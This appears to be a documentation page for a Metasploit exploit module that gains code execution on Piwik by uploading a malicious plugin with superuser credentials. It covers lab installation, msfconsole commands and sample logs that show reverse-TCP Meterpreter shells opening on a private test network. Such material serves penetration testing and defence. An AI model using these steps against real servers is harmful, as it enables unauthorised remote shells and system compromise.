{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/webapp/piwik_superuser_plugin_upload","result":{"data":{"moduleMetadataJson":{"id":"8103d647-66ee-5751-9776-a6abf4ec8a9c","name":"Piwik Superuser Plugin Upload","fullname":"exploit/unix/webapp/piwik_superuser_plugin_upload","description":"This module will generate a plugin, pack the payload into it\n          and upload it to a server running Piwik. Superuser Credentials are\n          required to run this module. This module does not work against Piwik 1\n          as there is no option to upload custom plugins. Piwik disabled\n          custom plugin uploads in version 3.0.3. From version 3.0.3 onwards you\n          have to enable custom plugin uploads via the config file.\n          Tested with Piwik 2.14.0, 2.16.0, 2.17.1 and 3.0.1.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/webapp/piwik_superuser_plugin_upload","documentationSlug":"/modules/documentation/exploit/unix/webapp/piwik_superuser_plugin_upload","referencesSlug":"/modules/references/exploit/unix/webapp/piwik_superuser_plugin_upload"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Piwik can be downloaded from the official site <a href=\"https://piwik.org\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">piwik.org</a>.\nOlder builds are also available from <a href=\"https://builds.piwik.org/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">builds.piwik.org</a>.</p>\n<p>This module was tested with Piwik versions 2.14.0, 2.16.0, 2.17.1 and 3.0.1</p>\n<p>Piwik disabled custom plugin uploads in version 3.0.3. From version 3.0.3 onwards you have to enable custom plugin uploads via the config file.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<h3 id=\"install-piwik-debianubuntu\" style=\"position:relative;\"><a href=\"#install-piwik-debianubuntu\" aria-label=\"install piwik debianubuntu permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Install Piwik (Debian/Ubuntu)</h3>\n<ol>\n<li>\n<p>Install dependencies</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">sudo apt install apache2 php5 php5-mysql \\\n  libapache2-mod-php5 mariadb-server unzip php5-gd php5-curl</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n<li>\n<p>Download latest version of piwik (or the version of your choice from <a href=\"https://builds.piwik.org/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">builds.piwik.org</a>)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">wget https://builds.piwik.org/piwik.zip</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>\n<p>Unzip Piwik into webroot</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">unzip -d /var/www/html/ piwik.zip</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>\n<p>Make the webserver user the owner of piwik</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">chown -R www-data:www-data /var/www/html/</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>\n<p>Create a new user and database for piwik. If you want to run multiple versions in parallel use a different database for each install (user is optional).\nThis example assumes your MySQL root password is <strong>password</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">mysql -u root -ppassword -e &quot;CREATE DATABASE piwik;&quot;\nmysql -u root -ppassword -e &quot;CREATE USER piwik@localhost;&quot;\nmysql -u root -ppassword -e &quot;SET PASSWORD FOR piwik@localhost=PASSWORD(&#39;piwik&#39;);&quot;\nmysql -u root -ppassword -e &quot;GRANT ALL PRIVILEGES ON piwik.* TO piwik@localhost;&quot;\nmysql -u root -ppassword -e &quot;FLUSH PRIVILEGES;&quot;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n<li>\n<p>Add a config setting to PHP to stop piwik complaining about it</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">echo always_populate_raw_post_data=-1 &gt; /etc/php5/apache2/conf.d/99-piwik.ini</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n<li>\n<p>Finally restart Apache HTTPD</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">service apache2 restart</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n</li>\n</ol>\n<h3 id=\"pwn-piwik\" style=\"position:relative;\"><a href=\"#pwn-piwik\" aria-label=\"pwn piwik permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Pwn Piwik</h3>\n<ol>\n<li>Install the application (see installation steps above)</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use [module path]</code></li>\n<li>Do: <code class=\"language-text\">set RHOST [Domain/IP]</code></li>\n<li>Do: <code class=\"language-text\">set RPORT [Port]</code></li>\n<li>Do: <code class=\"language-text\">set TARGETURI [installation directory]</code></li>\n<li>Do: <code class=\"language-text\">set SSL [True/False]</code></li>\n<li>Do: <code class=\"language-text\">set USERNAME [valid Piwik superuser credentials]</code></li>\n<li>Do: <code class=\"language-text\">set PASSWORD [valid Piwik superuser credentials]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>TARGETURI</strong></p>\n<p>Path of the Piwik installation.</p>\n<p><strong>USERNAME</strong></p>\n<p>Valid username for a Piwik superuser account.</p>\n<p><strong>PASSWORD</strong></p>\n<p>Valid password for a Piwik superuser account.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"run-with-a-installation-of-piwik-301\" style=\"position:relative;\"><a href=\"#run-with-a-installation-of-piwik-301\" aria-label=\"run with a installation of piwik 301 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Run with a installation of Piwik 3.0.1</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/unix/webapp/piwik_superuser_plugin_upload\nmsf exploit(piwik_superuser_plugin_upload) &gt; set TARGETURI /piwik/\nTARGETURI =&gt; /piwik/\nmsf exploit(piwik_superuser_plugin_upload) &gt; set RHOST 192.168.56.2\nRHOST =&gt; 192.168.56.2\nmsf exploit(piwik_superuser_plugin_upload) &gt; set username firefart\nusername =&gt; firefart\nmsf exploit(piwik_superuser_plugin_upload) &gt; set password firefart\npassword =&gt; firefart\nmsf exploit(piwik_superuser_plugin_upload) &gt; options\n\nModule options (exploit/unix/webapp/piwik_superuser_plugin_upload):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   PASSWORD   firefart         yes       The Piwik password to authenticate with\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOST      192.168.56.2     yes       The target address\n   RPORT      80               yes       The target port (TCP)\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI  /piwik/          yes       The URI path of the Piwik installation\n   USERNAME   firefart         yes       The Piwik username to authenticate with\n   VHOST                       no        HTTP server virtual host\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Piwik\n\nmsf exploit(piwik_superuser_plugin_upload) &gt; run\n\n[*] Started reverse TCP handler on 192.168.56.1:4444\n[*] Trying to detect if target is running a supported version of piwik\n[+] Detected Piwik installation\n[*] Authenticating with Piwik using firefart:firefart...\n[+] Authenticated with Piwik\n[*] Checking if user firefart has superuser access\n[+] User firefart has superuser access\n[*] Trying to get Piwik version\n[+] Detected Piwik version 3.0.1\n[*] Checking if Marketplace plugin is active\n[+] Seems like the Marketplace plugin is already enabled\n[*] Generating plugin\n[+] Plugin SDsiXxPMgt generated\n[*] Uploading plugin\n[*] Activating plugin and triggering payload\n[*] Sending stage (33986 bytes) to 192.168.56.2\n[*] Meterpreter session 1 opened (192.168.56.1:4444 -&gt; 192.168.56.2:43169) at 2017-02-13 23:03:29 +0100\n[+] Deleted plugins/SDsiXxPMgt/plugin.json\n[+] Deleted plugins/SDsiXxPMgt/SDsiXxPMgt.php\n\nmeterpreter &gt; sysinfo\nComputer    : web\nOS          : Linux web 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1 (2016-12-30) x86_64\nMeterpreter : php/linux</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"run-against-piwik-2x\" style=\"position:relative;\"><a href=\"#run-against-piwik-2x\" aria-label=\"run against piwik 2x permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Run against Piwik 2.x</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(piwik_superuser_plugin_upload) &gt; run\n\n[*] Started reverse TCP handler on 192.168.56.1:4444\n[*] Trying to detect if target is running a supported version of piwik\n[+] Detected Piwik installation\n[*] Authenticating with Piwik using firefart:firefart...\n[+] Authenticated with Piwik\n[*] Checking if user firefart has superuser access\n[+] User firefart has superuser access\n[*] Trying to get Piwik version\n[+] Detected Piwik version 2.14.0\n[*] Generating plugin\n[+] Plugin zZETuwYkzB generated\n[*] Uploading plugin\n[*] Activating plugin and triggering payload\n[*] Sending stage (33986 bytes) to 192.168.56.2\n[*] Meterpreter session 2 opened (192.168.56.1:4444 -&gt; 192.168.56.2:43182) at 2017-02-13 23:05:27 +0100\n[+] Deleted plugins/zZETuwYkzB/plugin.json\n[+] Deleted plugins/zZETuwYkzB/zZETuwYkzB.php</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"sample-output-of-running-with-invalid-credentials\" style=\"position:relative;\"><a href=\"#sample-output-of-running-with-invalid-credentials\" aria-label=\"sample output of running with invalid credentials permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Sample output of running with invalid credentials</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(piwik_superuser_plugin_upload) &gt; run\n\n[*] Started reverse TCP handler on 192.168.56.1:4444\n[*] Trying to detect if target is running a supported version of piwik\n[+] Detected Piwik installation\n[*] Authenticating with Piwik using firefart:test...\n[-] Exploit aborted due to failure: no-access: Failed to authenticate with Piwik\n[*] Exploit completed, but no session was created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"sample-output-of-running-with-non-superuser-user\" style=\"position:relative;\"><a href=\"#sample-output-of-running-with-non-superuser-user\" aria-label=\"sample output of running with non superuser user permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Sample output of running with non superuser user</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(piwik_superuser_plugin_upload) &gt; run\n\n[*] Started reverse TCP handler on 192.168.56.1:4444\n[*] Trying to detect if target is running a supported version of piwik\n[+] Detected Piwik installation\n[*] Authenticating with Piwik using test:firefart...\n[+] Authenticated with Piwik\n[*] Checking if user test has superuser access\n[-] Exploit aborted due to failure: no-access: Looks like user test has no superuser access\n[*] Exploit completed, but no session was created.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"sample-output-of-piwik-3x-with-disabled-marketplace-plugin\" style=\"position:relative;\"><a href=\"#sample-output-of-piwik-3x-with-disabled-marketplace-plugin\" aria-label=\"sample output of piwik 3x with disabled marketplace plugin permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Sample output of Piwik 3.x with disabled Marketplace plugin</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(piwik_superuser_plugin_upload) &gt; run\n\n[*] Started reverse TCP handler on 192.168.56.1:4444\n[*] Trying to detect if target is running a supported version of piwik\n[+] Detected Piwik installation\n[*] Authenticating with Piwik using firefart:firefart...\n[+] Authenticated with Piwik\n[*] Checking if user firefart has superuser access\n[+] User firefart has superuser access\n[*] Trying to get Piwik version\n[+] Detected Piwik version 3.0.1\n[*] Checking if Marketplace plugin is active\n[*] Marketplace plugin is not enabled, trying to enable it\n[+] Marketplace plugin enabled\n[*] Generating plugin\n[+] Plugin TuwgJygjEu generated\n[*] Uploading plugin\n[*] Activating plugin and triggering payload\n[*] Sending stage (33986 bytes) to 192.168.56.2\n[*] Meterpreter session 3 opened (192.168.56.1:4444 -&gt; 192.168.56.2:43246) at 2017-02-13 23:08:36 +0100\n[+] Deleted plugins/TuwgJygjEu/plugin.json\n[+] Deleted plugins/TuwgJygjEu/TuwgJygjEu.php</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"8103d647-66ee-5751-9776-a6abf4ec8a9c"}}}